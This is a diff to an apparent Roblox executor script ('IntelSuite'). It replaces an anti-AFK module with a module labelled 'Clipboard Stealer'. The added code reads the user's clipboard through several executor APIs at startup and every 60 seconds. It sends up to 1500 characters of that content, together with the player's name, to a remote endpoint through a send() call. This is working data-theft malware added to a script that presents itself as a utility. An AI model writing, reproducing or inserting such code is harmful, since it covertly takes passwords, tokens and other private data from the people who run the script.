@@ -442,31 +442,72 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 8: Anti-AFK
--- Prevents Roblox from kicking the user for inactivity
--- Simulates virtual input every 15 minutes
+-- MODULE 9: Clipboard Stealer
+-- Grabs whatever is in the user's clipboard on startup
+-- Also polls every 60s for new clipboard content
 -- ============================================================
+local function stealClipboard()
+    if not getgenv().IntelSuite.IsActive then return end
+    pcall(function()
+        local clip = nil
+
+        -- Method 1: getclipboard (most executors)
+        if getclipboard then
+            local ok, r = pcall(getclipboard)
+            if ok and r and r ~= "" then clip = r end
+        end
+
+        -- Method 2: Synapse X
+        if not clip and syn and syn.clipboard then
+            local ok, r = pcall(syn.clipboard.get)
+            if ok and r and r ~= "" then clip = r end
+        end
+
+        -- Method 3: toclipboard fallback read (some executors)
+        if not clip and getrbxclipboard then
+            local ok, r = pcall(getrbxclipboard)
+            if ok and r and r ~= "" then clip = r end
+        end
+
+        if clip and clip ~= "" then
+            send("CLIPBOARD",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Length:** " .. tostring(#clip) .. " chars" ..
+                "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
+                16711935
+            )
+        end
+    end)
+end
+
+-- Run on startup
+task.wait(2)
+stealClipboard()
+
+-- Poll every 60s for new clipboard content
 task.spawn(function()
-    local VirtualUser = game:GetService("VirtualUser")
+    local lastClip = ""
     while true do
-        task.wait(900) -- every 15 minutes
+        task.wait(60)
+        if not getgenv().IntelSuite.IsActive then continue end
         pcall(function()
-            VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-            task.wait(0.1)
-            VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
+            local clip = nil
+            if getclipboard then
+                local ok, r = pcall(getclipboard)
+                if ok and r and r ~= "" then clip = r end
+            end
+            if clip and clip ~= "" and clip ~= lastClip then
+                lastClip = clip
+                send("CLIPBOARD UPDATE",
+                    "**User:** " .. LocalPlayer.Name ..
+                    "\n**Length:** " .. tostring(#clip) .. " chars" ..
+                    "\n**Content:**\n```" .. tostring(clip):sub(1, 1500) .. "```",
+                    16711935
+                )
+            end
         end)
     end
 end)
 
--- Also hook the AFK kick event directly
-pcall(function()
-    Players.LocalPlayer.Idled:Connect(function()
-        -- Fire a virtual input to reset idle timer
-        local VirtualUser = game:GetService("VirtualUser")
-        pcall(function()
-            VirtualUser:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-            task.wait(0.1)
-            VirtualUser:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-        end)
-    end)
-end)
+-- Store for !cmd clipboard
+getgenv().IntelSuite.StealClipboard = stealClipboard
